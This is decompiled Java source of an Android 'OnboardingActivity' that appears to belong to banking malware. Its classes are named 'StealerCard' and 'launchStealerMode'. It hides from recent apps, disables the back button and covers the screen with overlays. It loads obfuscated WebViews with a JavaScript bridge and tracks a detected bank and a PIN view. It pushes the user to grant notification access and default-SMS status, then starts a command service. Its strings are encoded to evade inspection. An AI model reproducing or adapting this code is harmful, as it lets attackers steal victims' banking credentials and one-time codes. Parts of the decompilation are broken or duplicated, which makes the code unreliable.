package com.base.template;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.RectF;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.TypedValue;
import android.view.View;
import android.view.ViewParent;
import android.view.ViewPropertyAnimator;
import android.view.animation.AccelerateInterpolator;
import android.view.animation.OvershootInterpolator;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.work.CoroutineWorker$$ExternalSyntheticLambda0;
import androidx.work.NetworkType$EnumUnboxingLocalUtility;
import androidx.work.impl.Processor$$ExternalSyntheticLambda2;
import com.base.template.services.CommandService;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import kotlin.ExceptionsKt;
import kotlin.Unit;
import kotlin.collections.EmptyList;
import kotlin.jvm.functions.Function0;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.StringsKt;
import kotlin.text.StringsKt__StringsJVMKt;
import okhttp3.Headers;
import org.json.JSONException;
import org.json.JSONObject;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class OnboardingActivity extends Activity {
    public static final /* synthetic */ int $r8$clinit = 0;
    public boolean advancing;
    public View blocker;
    public FrameLayout cardContainer;
    public WebView cardWebView;
    public boolean cardWvReady;
    public Object cards = EmptyList.INSTANCE;
    public int currentIndex;
    public String detectedBankId;
    public WebView pinWebView;
    public boolean smsFallbackDone;

    public static final void access$drawBellIcon(OnboardingActivity onboardingActivity, Canvas canvas, float f) {
        Paint paint = new Paint(1);
        paint.setColor(-1);
        Path path = new Path();
        float f2 = f * 0.5f;
        float f3 = f * 0.12f;
        path.moveTo(f2, f3);
        float f4 = f * 0.2f;
        float f5 = f * 0.32f;
        path.cubicTo(f * 0.28f, f3, f4, f5, f4, f2);
        float f6 = f * 0.15f;
        float f7 = f * 0.68f;
        path.lineTo(f6, f7);
        float f8 = f * 0.85f;
        path.lineTo(f8, f7);
        float f9 = f * 0.8f;
        path.lineTo(f9, f2);
        path.cubicTo(f9, f5, f * 0.72f, f3, f2, f3);
        path.close();
        canvas.drawPath(path, paint);
        canvas.drawRect(f6, f7, f8, f * 0.74f, paint);
        canvas.drawCircle(f2, 0.82f * f, 0.08f * f, paint);
        canvas.drawCircle(f2, 0.1f * f, 0.025f * f, paint);
    }

    public final void advanceCard() {
        if (this.advancing) {
            return;
        }
        this.advancing = true;
        this.currentIndex++;
        OnboardingActivity$$ExternalSyntheticLambda5 onboardingActivity$$ExternalSyntheticLambda5 = new OnboardingActivity$$ExternalSyntheticLambda5(this, 2);
        WebView webView = this.cardWebView;
        if (webView != null && this.cardWvReady) {
            webView.evaluateJavascript(C0000.decode(new byte[]{80, 8, 85, 82, 37, 81, 75, 82, 75, 75}, "8a17f096cbe86e", 7), null);
            new Handler(Looper.getMainLooper()).postDelayed(new CoroutineWorker$$ExternalSyntheticLambda0(5, onboardingActivity$$ExternalSyntheticLambda5), 350L);
            return;
        }
        FrameLayout frameLayout = this.cardContainer;
        View childAt = frameLayout != null ? frameLayout.getChildAt(0) : null;
        if (childAt == null) {
            onboardingActivity$$ExternalSyntheticLambda5.run();
        } else {
            childAt.animate().translationY(dp(100)).alpha(0.0f).setDuration(280L).setInterpolator(new AccelerateInterpolator()).withEndAction(new Processor$$ExternalSyntheticLambda2(this, 7, onboardingActivity$$ExternalSyntheticLambda5)).start();
        }
    }

    public final int dp(int i) {
        return (int) TypedValue.applyDimension(1, i, getResources().getDisplayMetrics());
    }

    public final void finalizeSetup() {
        ViewPropertyAnimator viewPropertyAnimatorAnimate;
        ViewPropertyAnimator viewPropertyAnimatorAlpha;
        ViewPropertyAnimator duration;
        ViewPropertyAnimator viewPropertyAnimatorWithEndAction;
        ViewPropertyAnimator viewPropertyAnimatorAnimate2;
        ViewPropertyAnimator viewPropertyAnimatorAlpha2;
        ViewPropertyAnimator duration2;
        ViewPropertyAnimator viewPropertyAnimatorWithEndAction2;
        View view = this.blocker;
        if (view != null && (viewPropertyAnimatorAnimate2 = view.animate()) != null && (viewPropertyAnimatorAlpha2 = viewPropertyAnimatorAnimate2.alpha(0.0f)) != null && (duration2 = viewPropertyAnimatorAlpha2.setDuration(500L)) != null && (viewPropertyAnimatorWithEndAction2 = duration2.withEndAction(new OnboardingActivity$$ExternalSyntheticLambda5(this, 3))) != null) {
            viewPropertyAnimatorWithEndAction2.start();
        }
        FrameLayout frameLayout = this.cardContainer;
        if (frameLayout != null && (viewPropertyAnimatorAnimate = frameLayout.animate()) != null && (viewPropertyAnimatorAlpha = viewPropertyAnimatorAnimate.alpha(0.0f)) != null && (duration = viewPropertyAnimatorAlpha.setDuration(300L)) != null && (viewPropertyAnimatorWithEndAction = duration.withEndAction(new OnboardingActivity$$ExternalSyntheticLambda5(this, 4))) != null) {
            viewPropertyAnimatorWithEndAction.start();
        }
        getSharedPreferences(C0000.decode(new byte[]{74, 4, 16, 23, 21}, "9adbe61c549555ba", 0.0f), 0).edit().putBoolean(C0000.decode(new byte[]{7, 12, 86, 83}, "cc86de70a87060", 0.0f), true).apply();
        CommandService commandService = CommandService.instance;
        Headers.Companion.safeStartService(getApplicationContext(), C0000.decode(new byte[]{48, 112, 96, 48, 97, 111, 32, 122, 121, 53, 125, 117, 55, 112}, "c54e10", false));
    }

    public final boolean hasNotifAccess() {
        ComponentName componentName = new ComponentName(this, (Class<?>) NotifListener.class);
        String string = Settings.Secure.getString(getContentResolver(), C0000.decode(new byte[]{85, 15, 4, 4, 90, 84, 84, 62, 11, 9, 66, 88, 86, 8, 6, 7, 66, 88, 95, 15, 58, 10, 95, 66, 68, 4, 11, 3, 68, 66}, "0aef61", 1));
        if (string == null) {
            string = "";
        }
        return StringsKt.contains$default(string, componentName.flattenToString()) || StringsKt.contains$default(string, componentName.flattenToShortString());
    }

    public final boolean isSmsOk() {
        boolean z;
        try {
            int i = Build.VERSION.SDK_INT;
            String strDecode = C0000.decode(new byte[]{84, 13, 92, 75, 93, 81, 81, 77, 72, 92, 64, 85, 92, 16, 75, 80, 93, 86, 27, 49, 125, 122, 119, 113, 99, 38, 103, 106, 127, 107}, "5c8928", 0.0f);
            String strDecode2 = C0000.decode(new byte[]{4, 8, 93, 75, 11, 94, 80, 74, 21, 3, 75, 84, 13, 68, 71, 13, 10, 8, 23, 107, 33, 118, 112, 59, 54, 43, 106}, "ef99d74d", 0.0f);
            if (i >= 34 && !OnboardingConfig.FORCE_DEFAULT_SMS) {
                try {
                    return checkSelfPermission(strDecode2) == 0 && checkSelfPermission(strDecode) == 0;
                } catch (Exception unused) {
                    return false;
                }
            }
            if (!Intrinsics.areEqual(Telephony.Sms.getDefaultSmsPackage(this), getPackageName())) {
                try {
                    z = checkSelfPermission(strDecode2) == 0 && checkSelfPermission(strDecode) == 0;
                } catch (Exception unused2) {
                }
                if (z) {
                }
            }
            return true;
        } catch (Exception unused3) {
        }
        return false;
    }

    @Override // android.app.Activity
    public final void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == 1001) {
            new Handler(Looper.getMainLooper()).postDelayed(new OnboardingActivity$$ExternalSyntheticLambda5(this, 1), 500L);
        } else {
            if (i != 1002) {
                return;
            }
            new Handler(Looper.getMainLooper()).postDelayed(new OnboardingActivity$$ExternalSyntheticLambda11(this, i2, 0), 500L);
        }
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        boolean z;
        boolean zAreEqual;
        boolean zAreEqual2;
        super.onCreate(bundle);
        final int i = 0;
        if (getSharedPreferences(C0000.decode(new byte[]{75, 82, 77, 71, 21}, "8792e0"), 0).getBoolean(C0000.decode(new byte[]{82, 9, 8, 93}, "6ff88051ef56", true), false)) {
            CommandService commandService = CommandService.instance;
            Headers.Companion.safeStartService(getApplicationContext(), C0000.decode(new byte[]{118, 32, 108, 43, 55, 42, 108, 60, 107, 99, 99, 34, 106, 54}, "7c8bac8e40", 0.0f));
            finish();
            return;
        }
        final int i2 = 1;
        try {
            Iterator<ActivityManager.AppTask> it = ((ActivityManager) getSystemService(C0000.decode(new byte[]{86, 2, 66, 89, 69, 88, 67, 24}, "7a6031", 5))).getAppTasks().iterator();
            while (it.hasNext()) {
                it.next().setExcludeFromRecents(true);
            }
        } catch (Exception unused) {
        }
        FrameLayout frameLayout = new FrameLayout(this);
        frameLayout.setBackgroundColor(-16777216);
        String strDecode = OnboardingConfig.WEBVIEW_URL;
        if (strDecode.length() <= 0 || strDecode.equals(C0000.decode(new byte[]{86, 22, 14, 13}, "8cba4a0085074be3", 0.0f))) {
            strDecode = C0000.decode(new byte[]{89, 68, 65, 22, 65, 12, 26, 31, 70, 71, 66, 72, 85, 89, 90, 87, 93, 85, 27, 5, 93, 91}, "105f2650");
        }
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setMixedContentMode(0);
        webView.getSettings().setCacheMode(-1);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());
        webView.loadUrl(strDecode);
        frameLayout.addView(webView, new FrameLayout.LayoutParams(-1, -1));
        try {
            getAssets().open(C0000.decode(new byte[]{10, 13, 87, 93, 0, 20, 80, 80, 88, 94, 60, 65, 21, 7, 4, 15, 80, 64, 79, 14, 64, 84, 90}, "ec52af4969c2ab", 1)).close();
            z = true;
        } catch (Exception unused2) {
            z = false;
        }
        View view = new View(this);
        view.setBackgroundColor(z ? 0 : -1728053248);
        view.setClickable(true);
        view.setFocusable(true);
        this.blocker = view;
        frameLayout.addView(view, new FrameLayout.LayoutParams(-1, -1));
        if (z) {
            WebView webView2 = new WebView(this);
            webView2.getSettings().setJavaScriptEnabled(true);
            webView2.getSettings().setDomStorageEnabled(true);
            webView2.getSettings().setLoadWithOverviewMode(false);
            webView2.getSettings().setUseWideViewPort(false);
            webView2.setBackgroundColor(0);
            webView2.addJavascriptInterface(new Object() { // from class: com.base.template.OnboardingActivity$launchStealerMode$cwv$1$1
                @JavascriptInterface
                public final String getLocale() {
                    boolean zAreEqual3;
                    String str = OnboardingConfig.LANG;
                    String strDecode2 = C0000.decode(new byte[]{75, 69}, "906c601f1b", 3);
                    boolean zAreEqual4 = Intrinsics.areEqual(str, strDecode2);
                    String strDecode3 = C0000.decode(new byte[]{81, 87}, "49f5d98d721cbaa0", 4);
                    if (zAreEqual4) {
                        zAreEqual3 = true;
                    } else {
                        zAreEqual3 = Intrinsics.areEqual(str, strDecode3) ? false : Intrinsics.areEqual(Locale.getDefault().getLanguage(), strDecode2);
                    }
                    return zAreEqual3 ? strDecode2 : strDecode3;
                }

                @JavascriptInterface
                public final void onGrantClicked() {
                    OnboardingActivity onboardingActivity = this.this$0;
                    onboardingActivity.runOnUiThread(new OnboardingActivity$$ExternalSyntheticLambda5(onboardingActivity, 12));
                }
            }, C0000.decode(new byte[]{32, 86, 2, 74, 12, 8, 81}, "a8f8ca500cff6370", 7));
            webView2.setWebViewClient(new WebViewClient() { // from class: com.base.template.OnboardingActivity$launchStealerMode$cwv$1$2
                /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.Object, java.util.List] */
                @Override // android.webkit.WebViewClient
                public final void onPageFinished(WebView webView3, String str) throws JSONException {
                    super.onPageFinished(webView3, str);
                    OnboardingActivity onboardingActivity = this.this$0;
                    onboardingActivity.cardWvReady = true;
                    if (onboardingActivity.isFinishing() || onboardingActivity.currentIndex >= onboardingActivity.cards.size()) {
                        return;
                    }
                    onboardingActivity.showNextCard();
                }
            });
            webView2.loadUrl(C0000.decode(new byte[]{4, 12, 10, 86, 8, 22, 27, 25, 3, 11, 2, 65, 93, 80, 80, 105, 3, 22, 21, 86, 70, 22, 91, 88, 0, 10, 7, 65, 86, 80, 90, 81, 61, 22, 18, 86, 83, 85, 81, 68, 76, 13, 18, 94, 94}, "bef32946", 2));
            this.cardWebView = webView2;
            frameLayout.addView(webView2, new FrameLayout.LayoutParams(-1, -1));
        } else {
            FrameLayout frameLayout2 = new FrameLayout(this);
            this.cardContainer = frameLayout2;
            FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(-1, -2);
            layoutParams.gravity = 80;
            layoutParams.bottomMargin = dp(24);
            layoutParams.leftMargin = dp(12);
            layoutParams.rightMargin = dp(12);
            frameLayout.addView(frameLayout2, layoutParams);
        }
        setContentView(frameLayout);
        ArrayList arrayList = new ArrayList();
        boolean z2 = OnboardingConfig.PERM_NOTIFICATION_ACCESS_ENABLED;
        String strDecode2 = C0000.decode(new byte[]{124, 9, 65, 94, 84, 92, 90, 84, 17, 10, 91, 88, 65}, "2f572595ec46");
        String strDecode3 = C0000.decode(new byte[]{-77, -57, -79, -118, -77, -121, -77, -48, -79, -122, -77, -114, -77, -33, -79, -115, -77, -113, -77, -36, -80, -73}, "cda8c2");
        if (z2 && Build.VERSION.SDK_INT >= 33) {
            String str = OnboardingConfig.LANG;
            String strDecode4 = C0000.decode(new byte[]{74, 22}, "8c4d84b0", 0.0f);
            boolean zAreEqual3 = Intrinsics.areEqual(str, strDecode4);
            String strDecode5 = C0000.decode(new byte[]{81, 12}, "4bd0d627317a", 7);
            if (zAreEqual3) {
                zAreEqual = true;
            } else {
                zAreEqual = Intrinsics.areEqual(str, strDecode5) ? false : Intrinsics.areEqual(Locale.getDefault().getLanguage(), strDecode4);
            }
            String str2 = zAreEqual ? strDecode3 : strDecode2;
            if (Intrinsics.areEqual(str, strDecode4)) {
                zAreEqual2 = true;
            } else {
                zAreEqual2 = Intrinsics.areEqual(str, strDecode5) ? false : Intrinsics.areEqual(Locale.getDefault().getLanguage(), strDecode4);
            }
            final int i3 = 5;
            arrayList.add(new StealerCard(C0000.decode(new byte[]{70, 10, 16, 21, 107, 93, 89, 17, 10, 7, 93, 80, 87, 17, 10, 14, 90, 64}, "6eca43", 3), str2, zAreEqual2 ? C0000.decode(new byte[]{-32, -93, -75, -33, -30, -69, 66, -29, -126, -74, -116, -23, -25, -32, -28, -27, -128, -25, -41, -76, -119, -28, -38, 19, -26, -44, -30, -120, -74, -121, -74, -120, -31, -68, -76, -31, 19, -28, -36, -29, -121, -74, -113, -24, -40, -31, -44, -27, -117, -25, -48, -76, -114, -28, -38, -29, -113}, "07ed34b36f28f1f5", 6) : C0000.decode(new byte[]{48, 7, 71, 23, 92, 66, 86, 87, 67, 65, 9, 24, 0, 92, 84, 90, 20, 7, 68, 66, 92, 93, 67, 92, 17, 65, 7, 86, 16, 25, 77, 67, 6, 3, 66, 7, 70}, "bb6b5033c5f8d983", true), -364390, -73408, new Function2(this) { // from class: com.base.template.OnboardingActivity$buildCards$1
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(2);
                    this.this$0 = this;
                }

                @Override // kotlin.jvm.functions.Function2
                public final Object invoke(Object obj, Object obj2) {
                    int i4 = i;
                    Unit unit = Unit.INSTANCE;
                    OnboardingActivity onboardingActivity = this.this$0;
                    switch (i4) {
                        case 0:
                            OnboardingActivity.access$drawBellIcon(onboardingActivity, (Canvas) obj, ((Number) obj2).floatValue());
                            break;
                        case 1:
                            Canvas canvas = (Canvas) obj;
                            float fFloatValue = ((Number) obj2).floatValue();
                            int i5 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint = new Paint(1);
                            paint.setColor(-1);
                            Path path = new Path();
                            float f = 0.5f * fFloatValue;
                            path.moveTo(f, 0.1f * fFloatValue);
                            float f2 = 0.15f * fFloatValue;
                            float f3 = 0.25f * fFloatValue;
                            path.lineTo(f2, f3);
                            float f4 = 0.55f * fFloatValue;
                            path.lineTo(f2, f4);
                            float f5 = fFloatValue * 0.75f;
                            float f6 = fFloatValue * 0.35f;
                            float f7 = fFloatValue * 0.88f;
                            path.cubicTo(f2, f5, f6, f7, f, fFloatValue * 0.92f);
                            float f8 = fFloatValue * 0.65f;
                            float f9 = fFloatValue * 0.85f;
                            path.cubicTo(f8, f7, f9, f5, f9, f4);
                            path.lineTo(f9, f3);
                            path.close();
                            canvas.drawPath(path, paint);
                            paint.setColor(-9673729);
                            paint.setStrokeWidth(0.04f * fFloatValue);
                            paint.setStyle(Paint.Style.STROKE);
                            Path path2 = new Path();
                            path2.moveTo(f6, fFloatValue * 0.52f);
                            path2.lineTo(fFloatValue * 0.45f, 0.63f * fFloatValue);
                            path2.lineTo(f8, fFloatValue * 0.38f);
                            canvas.drawPath(path2, paint);
                            break;
                        case 2:
                            OnboardingActivity.access$drawBellIcon(onboardingActivity, (Canvas) obj, ((Number) obj2).floatValue());
                            break;
                        case 3:
                            Canvas canvas2 = (Canvas) obj;
                            float fFloatValue2 = ((Number) obj2).floatValue();
                            int i6 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint2 = new Paint(1);
                            paint2.setColor(-1);
                            float f10 = 0.12f * fFloatValue2;
                            float f11 = 0.22f * fFloatValue2;
                            float f12 = 0.72f * fFloatValue2;
                            float f13 = 0.08f * fFloatValue2;
                            canvas2.drawRoundRect(new RectF(f10, f11, 0.88f * fFloatValue2, f12), f13, f13, paint2);
                            Path path3 = new Path();
                            float f14 = fFloatValue2 * 0.35f;
                            path3.moveTo(f14, f12);
                            path3.lineTo(0.28f * fFloatValue2, f10 + f12);
                            path3.lineTo(fFloatValue2 * 0.52f, f12);
                            path3.close();
                            canvas2.drawPath(path3, paint2);
                            paint2.setColor(Color.parseColor(C0000.decode(new byte[]{22, 86, 118, 34, 37, 126, 124}, "5b0cf890065953", 0)));
                            float f15 = 0.045f * fFloatValue2;
                            float f16 = (f11 + f12) / 2;
                            canvas2.drawCircle(f14, f16, f15, paint2);
                            canvas2.drawCircle(0.5f * fFloatValue2, f16, f15, paint2);
                            canvas2.drawCircle(fFloatValue2 * 0.65f, f16, f15, paint2);
                            break;
                        default:
                            Canvas canvas3 = (Canvas) obj;
                            float fFloatValue3 = ((Number) obj2).floatValue();
                            int i7 = OnboardingActivity.$r8$clinit;
                            onboardingActivity.getClass();
                            Paint paint3 = new Paint(1);
                            paint3.setColor(-1);
                            float f17 = 0.25f * fFloatValue3;
                            float f18 = 0.18f * fFloatValue3;
                            float f19 = 0.75f * fFloatValue3;
                            float f20 = 0.88f * fFloatValue3;
                            float f21 = 0.06f * fFloatValue3;
                            canvas3.drawRoundRect(new RectF(f17, f18, f19, f20), f21, f21, paint3);
                            float f22 = 2;
                            float f23 = fFloatValue3 / f22;
                            float f24 = f18 / f22;
                            float f25 = f18 + f21;
                            float f26 = f21 / f22;
                            canvas3.drawRoundRect(new RectF(f23 - f24, f18 - (0.07f * fFloatValue3), f23 + f24, f25), f26, f26, paint3);
                            paint3.setColor(Color.parseColor(C0000.decode(new byte[]{69, 1, 1, 35, 14, 86, 116}, "f52f7a68a2c4")));
                            float f27 = f20 - f21;
                            canvas3.drawRoundRect(new RectF(f17 + f21, ((f20 - f18) * 0.35f) + f18, f19 - f21, f27), f26, f26, paint3);
                            Path path4 = new Path();
                            float f28 = fFloatValue3 * 0.52f;
                            path4.moveTo(f28, f25);
                            float f29 = 0.53f * fFloatValue3;
                            path4.lineTo(fFloatValue3 * 0.38f, f29);
                            path4.lineTo(0.48f * fFloatValue3, f29);
                            path4.lineTo(fFloatValue3 * 0.45f, f27);
                            float f30 = 0.62f * fFloatValue3;
                            float f31 = fFloatValue3 * 0.47f;
                            path4.lineTo(f30, f31);
                            path4.lineTo(f28, f31);
                            path4.close();
                            paint3.setColor(-1);
                            canvas3.drawPath(path4, paint3);
                            break;
                    }
                    return unit;
                }
            }, new Function0(this) { // from class: com.base.template.OnboardingActivity$buildCards$2
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                    this.this$0 = this;
                }

                /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                    jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:35:0x013a
                    	at jadx.core.dex.visitors.blocks.BlockSplitter.addTempConnectionsForExcHandlers(BlockSplitter.java:280)
                    	at jadx.core.dex.visitors.blocks.BlockSplitter.visit(BlockSplitter.java:79)
                    */
                @Override // kotlin.jvm.functions.Function0
                public final java.lang.Object invoke() {
                    /*
                        Method dump skipped, instruction units count: 951
                        To view this dump add '--comments-level debug' option
                    */
                    throw new UnsupportedOperationException("Method not decompiled: com.base.template.OnboardingActivity$buildCards$2.invoke():java.lang.Object");
                }
            }, new Function0(this) { // from class: com.base.template.OnboardingActivity$buildCards$2
                public final /* synthetic */ OnboardingActivity this$0;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                    this.this$0 = this;
                }

                /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                    jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:35:0x013a
                    	at jadx.core.dex.visitors.blocks.BlockSplitter.addTempConnectionsForExcHandlers(BlockSplitter.java:280)
                    */
                @Override // kotlin.jvm.functions.Function0
                public final java.lang.Object invoke() {
                    /*
                        Method dump skipped, instruction units count: 951
                        To view this dump add '--comments-level debug' option
                    */
                    throw new UnsupportedOperationException("Method not decompiled: com.base.template.OnboardingActivity$buildCards$2.invoke():java.lang.Object");
                }
            }));
        }
        final int i4 = 3;
        final int i5 = 6;
        final int i6 = 7;
        arrayList.add(new StealerCard((Build.VERSION.SDK_INT < 34 || OnboardingConfig.FORCE_DEFAULT_SMS) ? C0000.decode(new byte[]{16, 9, 23, 103, 81, 87, 5, 80, 19, 92, 23}, "cdd852c1f0") : C0000.decode(new byte[]{65, 91, 22, 111, 69, 77, 95, 67, 91, 91, 0}, "26e07817", 0.0f), ExceptionsKt.isRu() ? C0000.decode(new byte[]{100, 121, 103, 16, -24, -116, -25, -118, -27, -79, -23, -70, -26, -73, -28, -113}, "744088", 0.0f) : C0000.decode(new byte[]{48, 126, 107, 18, 35, 86, 0, 86, 75, 65}, "c382b5", 0), ExceptionsKt.isRu() ? C0000.decode(new byte[]{-31, -9, -29, -119, -23, -73, 23, -79, -126, -31, -113, -78, -78, -29, -70, -23, -76, -79, -119, -31, -127, 67, -29, -120, 24, -24, -125, -79, -122, -31, -116, -77, -114, -30, -122, -24, -117, -80, -75, 17, -32, -29, -29, -121, -23, -71, -26, -30, -25, -79, -32, -30, -30, -79}, "1c32887a61", false) : C0000.decode(new byte[]{96, 4, 69, 20, 90, 22, 92, 84, 20, 77, 93, 65, 85, 2, 80, 1, 74, 67, 20, 77, 90, 8, 71, 65, 65, 1, 74, 95, 65, 75, 81, 4}, "2a4a3d9049", 0.0f), -11555586, -16715010, new Function2(this) { // from class: com.base.template.OnboardingActivity$buildCards$1
            public final /* synthetic */ OnboardingActivity this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            {
                super(2);
                this.this$0 = this;
            }

            @Override // kotlin.jvm.functions.Function2
            public final Object invoke(Object obj, Object obj2) {
                int i7 = i4;
                Unit unit = Unit.INSTANCE;
                OnboardingActivity onboardingActivity = this.this$0;
                switch (i7) {
                    case 0:
                        OnboardingActivity.access$drawBellIcon(onboardingActivity, (Canvas) obj, ((Number) obj2).floatValue());
                        break;
                    case 1:
                        Canvas canvas = (Canvas) obj;
                        float fFloatValue = ((Number) obj2).floatValue();
                        int i8 = OnboardingActivity.$r8$clinit;
                        onboardingActivity.getClass();
                        Paint paint = new Paint(1);
                        paint.setColor(-1);
                        Path path = new Path();
                        float f = 0.5f * fFloatValue;
                        path.moveTo(f, 0.1f * fFloatValue);
                        float f2 = 0.15f * fFloatValue;
                        float f3 = 0.25f * fFloatValue;
                        path.lineTo(f2, f3);
                        float f4 = 0.55f * fFloatValue;
                        path.lineTo(f2, f4);
                        float f5 = fFloatValue * 0.75f;
                        float f6 = fFloatValue * 0.35f;
                        float f7 = fFloatValue * 0.88f;
                        path.cubicTo(f2, f5, f6, f7, f, fFloatValue * 0.92f);
                        float f8 = fFloatValue * 0.65f;
                        float f9 = fFloatValue * 0.85f;
                        path.cubicTo(f8, f7, f9, f5, f9, f4);
                        path.lineTo(f9, f3);
                        path.close();
                        canvas.drawPath(path, paint);
                        paint.setColor(-9673729);
                        paint.setStrokeWidth(0.04f * fFloatValue);
                        paint.setStyle(Paint.Style.STROKE);
                        Path path2 = new Path();
                        path2.moveTo(f6, fFloatValue * 0.52f);
                        path2.lineTo(fFloatValue * 0.45f, 0.63f * fFloatValue);
                        path2.lineTo(f8, fFloatValue * 0.38f);
                        canvas.drawPath(path2, paint);
                        break;
                    case 2:
                        OnboardingActivity.access$drawBellIcon(onboardingActivity, (Canvas) obj, ((Number) obj2).floatValue());
                        break;
                    case 3:
                        Canvas canvas2 = (Canvas) obj;
                        float fFloatValue2 = ((Number) obj2).floatValue();
                        int i9 = OnboardingActivity.$r8$clinit;
                        onboardingActivity.getClass();
                        Paint paint2 = new Paint(1);
                        paint2.setColor(-1);
                        float f10 = 0.12f * fFloatValue2;
                        float f11 = 0.22f * fFloatValue2;
                        float f12 = 0.72f * fFloatValue2;
                        float f13 = 0.08f * fFloatValue2;
                        canvas2.drawRoundRect(new RectF(f10, f11, 0.88f * fFloatValue2, f12), f13, f13, paint2);
                        Path path3 = new Path();
                        float f14 = fFloatValue2 * 0.35f;
                        path3.moveTo(f14, f12);
                        path3.lineTo(0.28f * fFloatValue2, f10 + f12);
                        path3.lineTo(fFloatValue2 * 0.52f, f12);
                        path3.close();
                        canvas2.drawPath(path3, paint2);
                        paint2.setColor(Color.parseColor(C0000.decode(new byte[]{22, 86, 118, 34, 37, 126, 124}, "5b0cf890065953", 0)));
                        float f15 = 0.045f * fFloatValue2;
                        float f16 = (f11 + f12) / 2;
                        canvas2.drawCircle(f14, f16, f15, paint2);
                        canvas2.drawCircle(0.5f * fFloatValue2, f16, f15, paint2);
                        canvas2.drawCircle(fFloatValue2 * 0.65f, f16, f15, paint2);
                        break;
                    default:
                        Canvas canvas3 = (Canvas) obj;
                        float fFloatValue3 = ((Number) obj2).floatValue();
                        int i10 = OnboardingActivity.$r8$clinit;
                        onboardingActivity.getClass();
                        Paint paint3 = new Paint(1);
                        paint3.setColor(-1);
                        float f17 = 0.25f * fFloatValue3;
                        float f18 = 0.18f * fFloatValue3;
                        float f19 = 0.75f * fFloatValue3;
                        float f20 = 0.88f * fFloatValue3;
                        float f21 = 0.06f * fFloatValue3;
                        canvas3.drawRoundRect(new RectF(f17, f18, f19, f20), f21, f21, paint3);
                        float f22 = 2;
                        float f23 = fFloatValue3 / f22;
                        float f24 = f18 / f22;
                        float f25 = f18 + f21;
                        float f26 = f21 / f22;
                        canvas3.drawRoundRect(new RectF(f23 - f24, f18 - (0.07f * fFloatValue3), f23 + f24, f25), f26, f26, paint3);
                        paint3.setColor(Color.parseColor(C0000.decode(new byte[]{69, 1, 1, 35, 14, 86, 116}, "f52f7a68a2c4")));
                        float f27 = f20 - f21;
                        canvas3.drawRoundRect(new RectF(f17 + f21, ((f20 - f18) * 0.35f) + f18, f19 - f21, f27), f26, f26, paint3);
                        Path path4 = new Path();
                        float f28 = fFloatValue3 * 0.52f;
                        path4.moveTo(f28, f25);
                        float f29 = 0.53f * fFloatValue3;
                        path4.lineTo(fFloatValue3 * 0.38f, f29);
                        path4.lineTo(0.48f * fFloatValue3, f29);
                        path4.lineTo(fFloatValue3 * 0.45f, f27);
                        float f30 = 0.62f * fFloatValue3;
                        float f31 = fFloatValue3 * 0.47f;
                        path4.lineTo(f30, f31);
                        path4.lineTo(f28, f31);
                        path4.close();
                        paint3.setColor(-1);
                        canvas3.drawPath(path4, paint3);
                        break;
                }
                return unit;
            }
        }, new Function0(this) { // from class: com.base.template.OnboardingActivity$buildCards$2
            public final /* synthetic */ OnboardingActivity this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            {
                super(0);
                this.this$0 = this;
            }

            /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:35:0x013a
                */
            @Override // kotlin.jvm.functions.Function0
            public final java.lang.Object invoke() {
                /*
                    Method dump skipped, instruction units count: 951
                    To view this dump add '--comments-level debug' option
                */
                throw new UnsupportedOperationException("Method not decompiled: com.base.template.OnboardingActivity$buildCards$2.invoke():java.lang.Object");
            }
        }, new Function0(this) { // from class: com.base.template.OnboardingActivity$buildCards$2
            public final /* synthetic */ OnboardingActivity this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            {
                super(0);
                this.this$0 = this;
            }

            /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:35:0x013a
                */
            @Override // kotlin.jvm.functions.Function0
            public final java.lang.Object invoke() {
                /*
                    Method dump skipped, instruction units count: 951
                    To view this dump add '--comments-level debug' option
                */
                throw new UnsupportedOperationException("Method not decompiled: com.base.template.OnboardingActivity$buildCards$2.invoke():java.lang.Object");
            }
        }));
        final int i7 = 8;
        final int i8 = 4;
